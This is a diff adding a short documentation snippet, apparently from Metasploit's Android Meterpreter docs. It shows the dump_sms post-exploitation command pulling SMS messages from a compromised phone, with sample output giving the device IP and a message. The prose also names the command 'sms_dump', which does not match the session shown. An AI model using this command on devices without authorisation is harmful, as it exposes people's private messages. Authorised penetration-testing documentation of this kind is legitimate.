@@ -1,0 +1,28 @@
+The sms_dump command allows you to retrieve SMS messages. And save them as a text file. For example:
+
+meterpreter > dump_sms
+
+[*] Fetching 4 sms messages
+[*] SMS messages saved to: sms_dump_20160308163212.txt
+
+...
+
+$ cat sms_dump_20160308163212.txt
+
+=====================
+[+] SMS messages dump
+=====================
+
+Date: 2016-03-08 15:30:12 -0600
+OS: Android 5.1.1 - Linux 3.10.61-6309174 (aarch64)
+Remote IP: 192.168.1.207
+Remote Port: 59130
+
+#1
+Type	: Incoming
+Date	: 2016-03-08 15:29:32
+Address	: **********
+Status	: NOT_RECEIVED
+Message	: Hello world
+
+...
